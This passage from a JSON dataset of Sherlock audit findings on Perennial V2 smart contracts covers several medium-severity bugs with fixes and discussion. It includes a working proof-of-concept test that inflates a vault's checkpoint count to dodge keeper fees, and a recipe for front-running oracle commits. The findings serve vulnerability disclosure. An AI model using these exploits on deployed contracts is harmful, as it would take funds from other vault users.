}\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**polarzero** commented:\n> Medium. Perfectly explained and demonstrated in the report.\n\n\n\n**arjun-io**\n\nFixed: https://github.com/equilibria-xyz/perennial-v2/pull/103\n\n**panprog**\n\nFixed",
      "summary": "\nThis bug report is about an issue with the MultiInvoker liquidation action, which causes it to revert due to incorrect closable amount calculation when invalid oracle versions are present. The MultiInvoker incorrectly calculates the closable amount in its _latest function, which basically repeats the logic of the Market._settle function. However, it fails to adjust the new position when an invalid oracle version is settled, which leads to incorrect values for the closable amount and liquidation fee. In the end, this causes the liquidation action to revert and results in a loss of funds for the liquidator who should have received the liquidation fee. \n\nThe impact of this bug is that it breaks the important MultiInvoker functionality in rare edge cases. It was found by panprog and was fixed by arjun-io in the pull request 103. The fix was to add an else statement in the _latest function, either not changing the latest position in case of invalid oracle version, or adjusting the pending position before setting the latest position.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Fix Review",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-09-perennial-judging/issues/45",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "26486",
      "title": "M-4: MultiInvoker liquidation action will revert most of the time due to incorrect closable amount initialization",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-09-perennial-judging/issues/44 \n\n## Found by \npanprog\n\nThe fix to [issue 49 of the main contest](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/49) introduced new invalidation system and additional condition: liquidations must close maximum `closable` amount, which is the amount which can be maximally closed based on the latest settled position.\n\nThe problem is that `MultiInvoker` incorrectly calculates `closableAmount` (it's not initialized and thus will often return 0 instead of correct magnitude) and thus most `LIQUIDATION` actions will revert.\n\n## Vulnerability Detail\n\n`MultiInvoker` calculates the `closable` amount in its `_latest` function incorrectly. In particular, it doesn't initialize `closableAmount`, so it's set to 0 initially. It then scans pending positions, settling those which should be settled, and reducing `closableAmount` if necessary for remaining pending positions:\n```solidity\nfunction _latest(\n    IMarket market,\n    address account\n) internal view returns (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) {\n    // load parameters from the market\n    IPayoffProvider payoff = market.payoff();\n\n    // load latest settled position and price\n    uint256 latestTimestamp = market.oracle().latest().timestamp;\n    latestPosition = market.positions(account);\n    latestPrice = market.global().latestPrice;\n    UFixed6 previousMagnitude = latestPosition.magnitude();\n\n    // @audit-issue Should add:\n    // closableAmount = previousMagnitude;\n    // otherwise if no position is settled in the following loop, closableAmount incorrectly remains 0\n\n    // scan pending position for any ready-to-be-settled positions\n    Local memory local = market.locals(account);\n    for (uint256 id = local.latestId + 1; id <= local.currentId; id++) {\n\n        // load pending position\n        Position memory pendingPosition = market.pendingPositions(account, id);\n        pendingPosition.adjust(latestPosition);\n\n        // load oracle version for that position\n        OracleVersion memory oracleVersion = market.oracle().at(pendingPosition.timestamp);\n        if (address(payoff) != address(0)) oracleVersion.price = payoff.payoff(oracleVersion.price);\n\n        // virtual settlement\n        if (pendingPosition.timestamp <= latestTimestamp) {\n            if (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\n            latestPosition.update(pendingPosition);\n            if (oracleVersion.valid) latestPrice = oracleVersion.price;\n\n            previousMagnitude = latestPosition.magnitude();\n@@@         closableAmount = previousMagnitude;\n\n        // process pending positions\n        } else {\n            closableAmount = closableAmount\n                .sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n            previousMagnitude = latestPosition.magnitude();\n        }\n    }\n}\n```\n\nNotice, that `closableAmount` is initialized to `previousMagnitude` **only if there is at least one position that needs to be settled**. However, if `local.latestId == local.currentId` (which is the case for most of the liquidations - position becomes liquidatable due to price changes without any pending positions created by the user), this loop is skipped entirely, never setting `closableAmount`, so it's incorrectly returned as 0, although it's not 0 (it should be the latest settled position magnitude).\n\nSince `LIQUIDATE` action of `MultiInvoker` uses `_latest` to calculate `closableAmount` and `liquidationFee`, these values will be calculated incorrectly and will revert when trying to update the market. See the `_liquidate` market update reducing `currentPosition` by `closable` (which is 0 when it must be bigger):\n```solidity\nmarket.update(\n    account,\n    currentPosition.maker.isZero() ? UFixed6Lib.ZERO : currentPosition.maker.sub(closable),\n    currentPosition.long.isZero() ? UFixed6Lib.ZERO : currentPosition.long.sub(closable),\n    currentPosition.short.isZero() ? UFixed6Lib.ZERO : currentPosition.short.sub(closable),\n    Fixed6Lib.from(-1, liquidationFee),\n    true\n);\n```\n\nThis line will revert because `Market._invariant` verifies that `closableAmount` must be 0 after updating liquidated position:\n```solidity\nif (protected && (\n@@@ !closableAmount.isZero() ||\n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        collateralAfterFees.sub(collateral)\n    ) ||\n    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n)) revert MarketInvalidProtectionError();\n```\n\n## Impact\n\nAll `MultiInvoker` liquidation actions will revert if trying to liquidate users without positions which can be settled, which can happen in 2 cases:\n1. Liquidated user doesn't have any pending positions at all (`local.latestId == local.currentId`). This is the most common case (price has changed and user is liquidated without doing any actions) and we can reasonably expect that this will be the case for at least 50% of liquidations (probably more, like 80-90%).\n2. Liquidated user does have pending positions, but no pending position is ready to be settled yet. For example, if liquidator commits unrequested oracle version which liquidates user, even if the user already has pending position (but which is not yet ready to be settled).\n\nSince this breaks important `MultiInvoker` functionality in most cases and causes loss of funds to liquidator (revert instead of getting liquidation fee), I believe this should be High severity.\n\n## Code Snippet\n\nThere is no initialization of `closableAmount` in `MultiInvoker._latest` before the pending positions loop:\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L361-L375\n\nInitialization only happens when settling position:\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L393\n\nHowever, the loop will often be skipped entirely if there are no pending positions at all, thus `closableAmount` will be returned uninitialized (0):\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-extensions/contracts/MultiInvoker.sol#L376\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nInitialize `closableAmount` to `previousMagnitude`:\n```solidity\n    function _latest(\n        IMarket market,\n        address account\n    ) internal view returns (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) {\n        // load parameters from the market\n        IPayoffProvider payoff = market.payoff();\n\n        // load latest settled position and price\n        uint256 latestTimestamp = market.oracle().latest().timestamp;\n        latestPosition = market.positions(account);\n        latestPrice = market.global().latestPrice;\n        UFixed6 previousMagnitude = latestPosition.magnitude();\n+       closableAmount = previousMagnitude;\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**polarzero** commented:\n> High. This would both cause a loss of funds and a malfunction in the protocol.\n\n\n\n**kbrizzle**\n\nSince standalone `settle` was dropped in v2, I believe it's actually impossible for a local account to have no pending positions once initialized, since a new pending position is always created at `current` when settling `latest` and `current != latest`.\n\nNonetheless we've fixed this [here](https://github.com/equilibria-xyz/perennial-v2/pull/110) to remain consistent with the implementation in `Market`, which provides better safety in case we ever decide to bring back a standalone `settle` functionality in future versions.\n\n**panprog**\n\n> Since standalone `settle` was dropped in v2, I believe it's actually impossible for a local account to have no pending positions once initialized, since a new pending position is always created at `current` when settling `latest` and `current != latest`.\n\nAgree, didn't think about it but indeed it's not possible to make them equal. Still, it can happen as described in point 2 in the report: if liquidator commits oracle unrequested (so the latest is before the first position settlement of the account), then the loop will never enter the \"virtual settlement\" part and `closableAmount` will remain 0.\n\nSince it can still happen but only in certain edge case, this should be downgraded to medium.\n\n**panprog**\n\nFixed",
      "summary": "\nThis bug report is about an issue with MultiInvoker liquidation action that will often revert due to incorrect closable amount initialization. This bug was found by panprog and is associated with issue 49 of the main contest. The problem is that MultiInvoker incorrectly calculates closableAmount, which is the amount which can be maximally closed based on the latest settled position, by not initializing it. This means it will often return 0 instead of the correct magnitude.\n\nThe code snippet shows that there is no initialization of closableAmount in MultiInvoker._latest before the pending positions loop, and initialization only happens when settling position. However, the loop will often be skipped entirely if there are no pending positions at all, thus closableAmount will be returned uninitialized (0).\n\nThe impact of this bug is that all MultiInvoker liquidation actions will revert if trying to liquidate users without positions which can be settled, which can happen in two cases. This breaks important MultiInvoker functionality in most cases and causes loss of funds to liquidator (revert instead of getting liquidation fee).\n\nThe recommendation is to initialize closableAmount to previousMagnitude. This bug was discussed by sherlock-admin, polarzero, kbrizzle, and panprog. Polarzero commented that this should be High severity, kbrizzle mentioned that it is not possible for a local account to have no pending positions once initialized, and panprog fixed the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Fix Review",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-09-perennial-judging/issues/44",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "26485",
      "title": "M-3: `Vault.update(anyUser,0,0,0)` can be called for free to increase `checkpoint.count` and pay smaller keeper fee than necessary",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-09-perennial-judging/issues/29 \n\n## Found by \npanprog\n\nVault re-balances its deposits and redemptions once per oracle epoch, but since multiple users can deposit/redeem, rebalance keeper fee is shared equally between all users depositing and redeeming in the same epoch. For this reason, `checkpoint.count` counts the number of users who will split the keeper fee (each user pays `keeper fee / checkpoint.count`)\n\nThe problem is that there are currently 2 types of users who increase `checkpoint.count` while they do not pay any fee:\n1. Any user calling `Vault.update(user, 0, 0, 0)` isn't charged any fee but increases `checkpoint.count`\n2. Any user claiming assets is charged full `settlementFee` from the amount he claims, but is not charged any other (shared) fees after that, but still increases `checkpoint.count`\n\nThe 1st point is more severe, because it allows to intentionally reduce the keeper fee paid by calling `Vault.update(0,0,0)` from different random accounts (which costs only gas fees and nothing more). Each such call increases `checkpoint.count` and thus reduces the keeper fees paid by the attacker.\n\nAttack scenario:\n1. User deposits or withdraws from his normal account. `checkpoint.count = 1` for the epoch. Normally the user will pay the sum of the `settlementFee` of all the vault markets.\n2. User uses any 3 addresses without any funds other than ETH for gas to call `Vault.update(address1/2/3, 0,0,0)`. Each of these calls costs only gas to the user, but increases `checkpoint.count` to the value of 4.\n3. Once the epoch settles, user will only pay `settlementFee / 4` for his deposit/withdrawal, but the vault will still pay the Markets full `settlementFee` at the expense of the other vault users.\n\n## Vulnerability Detail\n\n`Vault._update(user, 0, 0, 0)` will pass all invariants checks:\n```solidity\n// invariant\n// @audit operator - pass\nif (msg.sender != account && !IVaultFactory(address(factory())).operators(account, msg.sender))\n    revert VaultNotOperatorError();\n// @audit 0,0,0 is single-sided - pass\nif (!depositAssets.add(redeemShares).add(claimAssets).eq(depositAssets.max(redeemShares).max(claimAssets)))\n    revert VaultNotSingleSidedError();\n// @audit depositAssets == 0 - pass\nif (depositAssets.gt(_maxDeposit(context)))\n    revert VaultDepositLimitExceededError();\n// @audit redeemShares == 0 - pass\nif (redeemShares.gt(_maxRedeem(context)))\n    revert VaultRedemptionLimitExceededError();\n// @audit depositAssets == 0 - pass\nif (!depositAssets.isZero() && depositAssets.lt(context.settlementFee))\n    revert VaultInsufficientMinimumError();\n// @audit redeemShares == 0 - pass\nif (!redeemShares.isZero() && context.latestCheckpoint.toAssets(redeemShares, context.settlementFee).isZero())\n    revert VaultInsufficientMinimumError();\n// @audit since this will be called by **different** users in the same epoch, this will also pass\nif (context.local.current != context.local.latest) revert VaultExistingOrderError();\n```\n\nIt then calculates amount to claim by calling `_socialize`:\n```solidity\n// asses socialization and settlement fee\nUFixed6 claimAmount = _socialize(context, depositAssets, redeemShares, claimAssets);\n...\nfunction _socialize(\n    Context memory context,\n    UFixed6 depositAssets,\n    UFixed6 redeemShares,\n    UFixed6 claimAssets\n) private view returns (UFixed6 claimAmount) {\n    // @audit global assets must be 0 to make (0,0,0) pass this function\n    if (context.global.assets.isZero()) return UFixed6Lib.ZERO;\n    UFixed6 totalCollateral = UFixed6Lib.from(_collateral(context).max(Fixed6Lib.ZERO));\n    claimAmount = claimAssets.muldiv(totalCollateral.min(context.global.assets), context.global.assets);\n\n    // @audit for (0,0,0) this will revert (underflow)\n    if (depositAssets.isZero() && redeemShares.isZero()) claimAmount = claimAmount.sub(context.settlementFee);\n}\n```\n\n`_socialize` will immediately return 0 if `context.global.assets == 0`.\nIf `context.global.assets > 0`, then this function will revert in the last line due to underflow (trying to subtract `settlementFee` from 0 `claimAmount`)\n\nThis is the condition for this issue to happen: global assets must be 0. Global assets are the amounts redeemed but not yet claimed by users. So this can reasonably happen in the first days of the vault life, when users mostly only deposit, or claim everything they withdraw.\n\nOnce this function passes, the following lines increase `checkpoint.count`:\n```solidity\n// update positions\ncontext.global.update(context.currentId, claimAssets, redeemShares, depositAssets, redeemShares);\ncontext.local.update(context.currentId, claimAssets, redeemShares, depositAssets, redeemShares);\ncontext.currentCheckpoint.update(depositAssets, redeemShares);\n...\n// Checkpoint library:\n...\nfunction update(Checkpoint memory self, UFixed6 deposit, UFixed6 redemption) internal pure {\n    (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));\n    self.count++;\n}\n```\n\nThe rest of the function executes normally.\n\nDuring position settlement, pending user deposits and redeems are reduced by the `keeper fees / checkpoint.count`:\n```solidity\n// Account library:\n...\nfunction processLocal(\n    Account memory self,\n    uint256 latestId,\n    Checkpoint memory checkpoint,\n    UFixed6 deposit,\n    UFixed6 redemption\n) internal pure {\n    self.latest = latestId;\n    (self.assets, self.shares) = (\n        self.assets.add(checkpoint.toAssetsLocal(redemption)),\n        self.shares.add(checkpoint.toSharesLocal(deposit))\n    );\n    (self.deposit, self.redemption) = (self.deposit.sub(deposit), self.redemption.sub(redemption));\n}\n...\n// Checkpoint library\n// toAssetsLocal / toSharesLocal calls _withoutKeeperLocal to calculate keeper fees:\n...\n    function _withoutKeeperLocal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n        UFixed6 keeperPer = self.count == 0 ? UFixed6Lib.ZERO : self.keeper.div(UFixed6Lib.from(self.count));\n        return _withoutKeeper(amount, keeperPer);\n    }\n```\n\nAlso notice that in `processLocal` the only thing which keeper fees influence are deposits and redemptions, but not claims.\n\n## Proof of concept\n\nThe scenario above is demonstrated in the test, add this to Vault.test.ts:\n```solidity\nit('inflate checkpoint count', async () => {\n    const settlementFee = parse6decimal('10.00')\n    const marketParameter = { ...(await market.parameter()) }\n    marketParameter.settlementFee = settlementFee\n    await market.connect(owner).updateParameter(marketParameter)\n    const btcMarketParameter = { ...(await btcMarket.parameter()) }\n    btcMarketParameter.settlementFee = settlementFee\n    await btcMarket.connect(owner).updateParameter(btcMarketParameter)\n\n    const deposit = parse6decimal('10000')\n    await vault.connect(user).update(user.address, deposit, 0, 0)\n    await updateOracle()\n    await vault.settle(user.address)\n\n    const deposit2 = parse6decimal('10000')\n    await vault.connect(user2).update(user2.address, deposit2, 0, 0)\n\n    // inflate checkpoint.count\n    await vault.connect(btcUser1).update(btcUser1.address, 0, 0, 0)\n    await vault.connect(btcUser2).update(btcUser2.address, 0, 0, 0)\n\n    await updateOracle()\n    await vault.connect(user2).settle(user2.address)\n\n    const checkpoint2 = await vault.checkpoints(3)\n    console.log(\"checkpoint count = \" + checkpoint2.count)\n\n    var account = await vault.accounts(user.address);\n    var assets = await vault.convertToAssets(account.shares);\n    console.log(\"User shares:\" + account.shares + \" assets: \" + assets);\n    var account = await vault.accounts(user2.address);\n    var assets = await vault.convertToAssets(account.shares);\n    console.log(\"User2 shares:\" + account.shares + \" assets: \" + assets);\n})\n```\n\nConsole output:\n```solidity\ncheckpoint count = 3\nUser shares:10000000000 assets: 9990218973\nUser2 shares:10013140463 assets: 10003346584\n```\n\nSo the user2 inflates his deposited amounts by paying smaller keeper fee.\n\nIf 2 lines which inflate checkpoint count (after corresponding comment) are deleted, then the output is:\n```solidity\ncheckpoint count = 1\nUser shares:10000000000 assets: 9990218973\nUser2 shares:9999780702 assets: 9989999890\n```\n\nSo if not inflated, user2 pays correct amount and has roughly the same assets as user1 after his deposit.\n\n## Impact\n\nMalicious vault user can inflate `checkpoint.count` to pay much smaller keeper fee than they should at the expense of the other vault users.\n\n## Code Snippet\n\n`Vault.update(0,0,0)` will increase `checkpoint.count` here:\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-vault/contracts/Vault.sol#L300\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider reverting (0,0,0) vault updates, or maybe redirecting to `settle` in this case. Additionally, consider updating checkpoint only if `depositAssets` or `redeemShares` are not zero:\n```solidity\nif (!depositAssets.isZero() || !redeemShares.isZero())\n    context.currentCheckpoint.update(depositAssets, redeemShares);\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**polarzero** commented:\n> Medium. Perfectly explained and demonstrated in the report.\n\n\n\n**kbrizzle**\n\nFixed in: https://github.com/equilibria-xyz/perennial-v2/pull/111.\n\n**panprog**\n\n1. `Vault(user,0,0,0)` increasing `checkpoint.count` (medium severity) - fixed\n2. Any user who is claiming still increases `checkpoint.count`, although he pays for the claim fully and doesn't participate in paying the keeper fee for deposit/redeem, thus he shouldn't increase `checkpoint.count` (low severity) - not fixed\n\n\n**kbrizzle**\n\nSince (2) is overcharging the fee instead of undercharging (claim pays entire settlement fee instead of splitting the resulting fee with others in version), we're going to leave this as-is. We'll make a note of this in case we improve the claiming flow in the future.\n\n**jacksanford1**\n\nBased on @kbrizzle's comment, Sherlock will consider the issue brought up in #2 in the comment above by panprog as acknowledged.",
      "summary": "\nThis bug report discusses an issue with the Vault smart contract where users can call `Vault.update(anyUser,0,0,0)` to increase the `checkpoint.count` and pay a smaller keeper fee than necessary. This can be done by using any 3 addresses without any funds other than ETH for gas. The issue is that this call passes all invariants checks, and then calculates the amount to claim by calling `_socialize`. This function will immediately return 0 if `context.global.assets == 0`. If `context.global.assets > 0`, then this function will revert in the last line due to underflow. This is the condition for this issue to happen: global assets must be 0.\n\nThe attack scenario is demonstrated in the test. If the two lines which inflate the `checkpoint.count` are not deleted, then the output is `checkpoint count = 3` and user2 inflates their deposited amounts by paying a smaller keeper fee. If these lines are deleted, then the output is `checkpoint count = 1` and user2 pays the correct amount.\n\nThe recommendation is to consider reverting (0,0,0) vault updates, or maybe redirecting to `settle` in this case. Additionally, consider updating the checkpoint only if `depositAssets` or `redeemShares` are not zero.\n\nThe issue was fixed in https://github.com/equilibria-xyz/perennial-v2/pull/111, and the second issue raised by panprog was acknowledged by Sherlock.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Fix Review",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-09-perennial-judging/issues/29",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "26484",
      "title": "M-2: commitRequested() front-run  malicious invalid oralce",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-09-perennial-judging/issues/27 \n\n## Found by \nbin2chen\nBoth `commitRequested()` and `commit()` can modify `lastCommittedPublishTime`, and both check that they cannot `pythPrice.publishTime<=lastCommittedPublishTime`.\nThis allows a malicious user to front-run `commitRequested()` to execute `commit()`, causing `commitRequested()` to revert, invalid oralce\n\n## Vulnerability Detail\n\nExecution of the `commitRequested()` method restricts the `lastCommittedPublishTime` from going backward.\n\n```solidity\n    function commitRequested(uint256 versionIndex, bytes calldata updateData)\n        public\n        payable\n        keep(KEEPER_REWARD_PREMIUM, KEEPER_BUFFER, updateData, \"\")\n    {\n...\n\n@>      if (pythPrice.publishTime <= lastCommittedPublishTime) revert PythOracleNonIncreasingPublishTimes();\n@>        lastCommittedPublishTime = pythPrice.publishTime;\n...\n```\n`commit()` has a similar limitation and can set `lastCommittedPublishTime`.\n\n```solidity\n    function commit(uint256 versionIndex, uint256 oracleVersion, bytes calldata updateData) external payable {\n        if (\n            versionList.length > versionIndex &&                // must be a requested version\n            versionIndex >= nextVersionIndexToCommit &&         // must be the next (or later) requested version\n@>          oracleVersion == versionList[versionIndex]          // must be the corresponding timestamp\n        ) {\n            commitRequested(versionIndex, updateData);\n            return;\n        }\n...\n@>      if (pythPrice.publishTime <= lastCommittedPublishTime) revert PythOracleNonIncreasingPublishTimes();\n@>      lastCommittedPublishTime = pythPrice.publishTime;\n....\n```\n\nThis leads to a situation where anyone can front-run `commitRequested()` and use his `updateData` to execute `commit()`.\nIn order to satisfy the `commit()` constraint, we need to pass a `commit()` parameter set as follows\n\n1. versionIndex= nextVersionIndexToCommit\n2. oracleVersion = versionList[versionIndex]  - 1    and oralceVersion > _latestVersion\n3. pythPrice.publishTime >= versionList[versionIndex]  - 1  + MIN_VALID_TIME_AFTER_VERSION\n\nThis way `lastCommittedPublishTime` will be modified, causing `commitRequested()` to execute with `revert PythOracleNonIncreasingPublishTimes`\n\nExample:\nGiven: \nnextVersionIndexToCommit = 10\nversionList[10]   = 200  \n_latestVersion    = 100  \n\nwhen:\n 1. keeper exexute commitRequested(versionIndex = 10 , VAA{ publishTime = 205})\n 2. front-run execute `commit(versionIndex = 10 , oracleVersion = 200-1 , VAA{ publishTime = 205})\n     * versionIndex= nextVersionIndexToCommit    pass\n     * oracleVersion = versionList[versionIndex]  - 1    and oralceVersion > _latestVersion  (pass) \n     * pythPrice.publishTime >= versionList[versionIndex]  - 1  + MIN_VALID_TIME_AFTER_VERSION  (pass)\n\n\nBy the time the `keeper` submits the next VVA, the price may have passed its expiration date\n\n## Impact\n\nIf the user can control the oralce invalidation, it can lead to many problems\ne.g. invalidating `oracle` to one's own detriment, not having to take losses\nMaliciously destroying other people's profits, etc.\n\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L174\n\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/pyth/PythOracle.sol#L129\n\n## Tool used\n\nManual Review\n\n## Recommendation\ncheck `pythPrice` whether valid for `nextVersionIndexToCommit`\n```diff\n    function commit(uint256 versionIndex, uint256 oracleVersion, bytes calldata updateData) external payable {\n        // Must be before the next requested version to commit, if it exists\n        // Otherwise, try to commit it as the next request version to commit\n        if (\n            versionList.length > versionIndex &&                // must be a requested version\n            versionIndex >= nextVersionIndexToCommit &&         // must be the next (or later) requested version\n            oracleVersion == versionList[versionIndex]          // must be the corresponding timestamp\n        ) {\n            commitRequested(versionIndex, updateData);\n            return;\n        }\n\n        PythStructs.Price memory pythPrice = _validateAndGetPrice(oracleVersion, updateData);\n\n        // Price must be more recent than that of the most recently committed version\n        if (pythPrice.publishTime <= lastCommittedPublishTime) revert PythOracleNonIncreasingPublishTimes();\n        lastCommittedPublishTime = pythPrice.publishTime;\n\n        // Oracle version must be more recent than that of the most recently committed version\n        uint256 minVersion = _latestVersion;\n        uint256 maxVersion = versionList.length > versionIndex ? versionList[versionIndex] : current();\n\n        if (versionIndex < nextVersionIndexToCommit) revert PythOracleVersionIndexTooLowError();\n        if (versionIndex > nextVersionIndexToCommit && block.timestamp <= versionList[versionIndex - 1] + GRACE_PERIOD)\n            revert PythOracleGracePeriodHasNotExpiredError();\n        if (oracleVersion <= minVersion || oracleVersion >= maxVersion) revert PythOracleVersionOutsideRangeError();\n+       if (nextVersionIndexToCommit < versionList.length) {\n+           if (\n+               pythPrice.publishTime >= versionList[nextVersionIndexToCommit] + MIN_VALID_TIME_AFTER_VERSION &&\n+               pythPrice.publishTime <= versionList[nextVersionIndexToCommit] + MAX_VALID_TIME_AFTER_VERSION\n+           ) revert PythOracleUpdateValidForPreviousVersionError();\n+       }\n\n\n        _recordPrice(oracleVersion, pythPrice);\n        nextVersionIndexToCommit = versionIndex;\n        _latestVersion = oracleVersion;\n    }\n```\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n4 comment(s) were left on this issue during the judging contest.\n\n**panprog** commented:\n> borderline low/medium. The issue is valid and can force keepers to re-submit if they're frontrun. It's still always possible to submit a price with publishTime which is at MAX_VALID_TIME_AFTER_VERSION away from version time, but this still interfere oracle keepers process and increases chances of invalid version. Definitely not high, because it doesn't break things, just forces to re-submit transactions and keepers can also front-run each other, so reverted keep transactions are not something possible only due to this issue. Probably a better fix is to commitRequested instead of just commit if publishTime is between MIN and MAX valid time.\n\n**n33k** commented:\n> invalid, expected behavior for commitRequested to revert because commit alreay provided the oracleVersion\n\n**0xyPhilic** commented:\n> invalid because there is no proof of funds loss\n\n**polarzero** commented:\n> Medium. Not sure what the incentive would be for an attacker to do this, and the impact it would have, but I'd rather have it downgraded than ignored.",
      "summary": "\nA bug report has been found in the Sherlok Audit GitHub repository which affects the `commitRequested()` and `commit()` methods of the PythOracle contract. The bug allows a malicious user to front-run `commitRequested()` and execute `commit()` by passing a set of parameters that satisfy the constraints of the `commit()` method. This causes `commitRequested()` to revert, invalidating the oralce. This can lead to many problems, such as invalidating `oracle` to one's own detriment, not having to take losses, maliciously destroying other people's profits, etc. The code snippets and tool used to find the bug have been provided in the report. The vulnerability was discussed by four people, and it was concluded to be a medium severity bug. A better fix for the bug has also been suggested.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Fix Review",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-09-perennial-judging/issues/27",
      "tags": [
        "Oracle",
        "Front-Running"
      ],
      "finders": [
        "bin2chen"
      ]
    },
    {
      "id": "26483",
      "title": "M-1: During oracle provider switch, if previous provider feed stops working completely, oracle and market will be stuck with user funds locked in the contract",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-09-perennial-judging/issues/10 \n\n## Found by \npanprog\n\nThe [issue 46 of the main contest](https://github.com/sherlock-audit/2023-07-perennial-judging/issues/46) after the fix still stands with a more severe condition as described by WatchPug in fix review:\n> If we assume it's possible for the previous Python feed to experience a more severe issue: instead of not having an eligible price for the requested oracleVersion, the feed completely stopped working after the requested time, making it impossible to find ANY valid price at a later time than the last requested time, this issue would still exist.\n\nSponsor response still implies that the previous provider feed **is available**, as they say non-requested version could be posted, but if this feed is no longer available, it will be impossible to commit unrequested, because there will be no pyth price and signature to commit.\n\n> if the previous oracles underlying off-chain feed goes down permanently, once the grace period has passed, a non-requested version could be posted to the previous oracle, moving its latest() forward to that point, allowing the switchover to complete.\n\n## Vulnerability Detail\n\nWhen the oracle provider is updated (switched to a new provider), the latest status (price) returned by the oracle will come from the previous provider until the last request is commited for it, only then the price feed from the new provider will be used. However, it can happen that pyth price feed stops working completely before (or just after) the oracle is updated to a new provider. This means that valid price with signature for **any timestamp after the last request** is not available. In this case, the oracle price will be stuck, because it will ignore new provider, but the previous provider can never finalize (commit a fresh price). As such, the oracle price will get stuck and will never update, breaking the whole protocol with user funds stuck in the protocol.\n\n## Impact\n\nSwitching oracle provider can make the oracle stuck and stop updating new prices. This will mean the market will become stale and will revert on all requests from user, disallowing to withdraw funds, bricking the contract entirely.\n\n## Code Snippet\n\n`Oracle._latestStale` will always return false due to this line (since `latest().timestamp` can never advance without a price feed):\nhttps://github.com/sherlock-audit/2023-09-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/Oracle.sol#L128\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider ignoring line 128 in `Oracle._latestStale` if a certain timeout has passed after the switch (`block.timestamp - oracles[global.latest].timestamp > SWITCH_TIMEOUT`). This will allow the switch to proceed after some timeout even if previous provider remains uncommited.\n\n\n\n## Discussion\n\n**sherlock-admin**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**polarzero** commented:\n> Medium. The issue is also preoccupying. It does also require a few unlikely conditions, yet it could incur a significant loss of funds for the users.",
      "summary": "\nThis bug report discusses an issue where during an oracle provider switch, if the previous provider feed stops working completely, the oracle and market will be stuck with user funds locked in the contract. This issue was found by panprog and was discussed by polarzero who commented that it was a medium issue and requires a few unlikely conditions to occur, yet it could incur a significant loss of funds for the users.\n\nThe vulnerability detail explains that when the oracle provider is updated to a new provider, the latest status (price) returned by the oracle will come from the previous provider until the last request is commited for it. However, if the pyth price feed stops working completely before (or just after) the oracle is updated to a new provider, it will be impossible to commit unrequested, because there will be no pyth price and signature to commit. This means that the oracle price will get stuck and will never update, breaking the whole protocol with user funds stuck in the protocol.\n\nThe impact of this issue is that switching oracle provider can make the oracle stuck and stop updating new prices. This will mean the market will become stale and will revert on all requests from user, disallowing to withdraw funds, bricking the contract entirely.\n\nThe recommendation for this issue is to consider ignoring line 128 in `Oracle._latestStale` if a certain timeout has passed after the switch. This will allow the switch to proceed after some timeout even if previous provider remains uncommited.",
      "quality_score": 4,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Perennial V2 Fix Review",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-09-perennial-judging/issues/10",
      "tags": [],
      "finders": [
        "panprog"
      ]
    },
    {
      "id": "30021",
      "title": "[I-01] Consider using the ERC4626 standard",
      "impact": "LOW",
